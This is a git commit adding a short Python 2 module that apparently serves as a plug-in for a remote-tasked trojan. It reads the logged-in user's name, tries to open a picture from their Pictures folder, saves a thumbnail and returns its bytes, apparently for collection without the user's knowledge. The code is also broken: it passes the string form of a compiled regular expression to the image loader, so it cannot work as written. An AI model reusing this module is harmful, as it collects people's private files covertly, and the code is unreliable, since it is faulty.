472fcb956753807a259c2e45a641c5c309053b31
craigcullen <craig340@gmail.com>
2016-03-27 19:54:01 -0600

    change file

---
+++ modules/login_name_jpeg_test.py
@@ -0,0 +1,15 @@
+import os
+import re
+
+from PIL import Image
+
+def run(**args):
+    print "[*] In login_name_jpeg module."
+    name = str(os.getlogin())
+    pic = Image.open(str(re.compile("\/home\/" + name + "\/Pictures\/^.*\.jpg")))
+    size = 120, 120
+    pic.thumbnail(size)
+    pic.save("/home/" + name + "/Pictures/KB" + ".thumbnail", "JPEG")
+    pic.close()
+    with open ("/home/" + name + "/Pictures/KB.thumbnail", "rb") as pic:
+        return pic.read()
